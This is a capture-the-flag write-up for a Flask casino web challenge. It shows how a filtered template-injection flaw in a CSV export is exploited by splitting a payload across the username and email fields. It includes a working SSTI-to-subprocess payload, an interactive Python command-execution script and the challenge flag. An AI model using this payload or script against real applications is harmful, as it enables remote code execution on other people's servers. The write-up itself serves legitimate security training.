## Casino

### Description

Welcome, everyone !
Welcome to WebTopia's Casino !
Witness the wonders of this marvelous place, take your time, enjoy it...
...
_and please don't look too much for vulnerabilities_

**Authors : algorab & Sto**

### Solution

We are facing a web application that allows to create an account in order to play at a wonderful casino game.
After playing for a (way too long, how can this be so addictive) while, we finally discover that there is also an export account data functionality.
We can also see that the application is a Python application, by reviewing the headers of the response:
```
$ curl -I http://localhost:5000/

HTTP/1.1 302 FOUND
Server: Werkzeug/3.0.4 Python/3.13.3
Date: Wed, 09 Apr 2025 11:17:52 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 217
Location: /login?next=%2F
Vary: Cookie
Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIlBsZWFzZSBsb2cgaW4gdG8gYWNjZXNzIHRoaXMgcGFnZS4iXX1dfQ.Z_ZXYA.kXKRY3S5oU6HvrClxTCWBMmAD-g; HttpOnly; Path=/
Connection: close
```

We then can try to look for SSTI!

The account information exportation option gives a CSV file that contains among other information our username and mail. Therefore, we can try to inject stuff in those fields. After some tests, we can clearly see that there are some filters here. Especially, if the field contains both `{` and `}`, it gets sanitized. There are also filters for XSS and SQLi related characters.
Therefore, we have to craft a payload that uses both the username and the email field. Then, we will be able to achieve RCE using the SSTI.

Here is the general synthax of the final payload:
```json
{"username":"{{ \"\"\"", 
"email": "\"\"\".__class__.mro()[1].__subclasses__()[524](\"payload\",shell=True,stdout=-1).communicate()[0].strip()}}",
"password": "hello"}
```

Let's break down the payload. The `username` field contains two opening brackets to start the SSTI. Then, it contains three double quotes, to create a string from all the text between the end of the username field and the beginning of the email field in the CSV file. After that, the `email` field closes the string, and accesses the `subprocess.Popen` function to execute the payload. The subclass index can vary depending on your version of python.

Here is a script that allows to automate the process:

```python
import requests
import secrets
from base64 import b64decode

url = "http://localhost:5000/"

while True:

    payload = input(">>> ") + " | base64 | tr -d '\n'"

    prefix = secrets.token_hex(32)
    s = requests.Session()

    s.post(url+"register", {'username':prefix+'{{ """', 
                                'email': '""".__class__.mro()[1].__subclasses__()[528]("'+payload+'",shell=True,stdout=-1).communicate()[0].strip()}}',
                                'password': 'test'})
    s.post(url+"login", {'username':prefix+'{{ """', 'password': 'test'})
    resp = s.get(url+"export")
    print(b64decode(resp.text.split("&#39;")[1]).decode())
```

Using this script, we can find the `.passwd` file containing the flag.

### Flag

`N0PS{s5T1_4veRywh3R3!!}`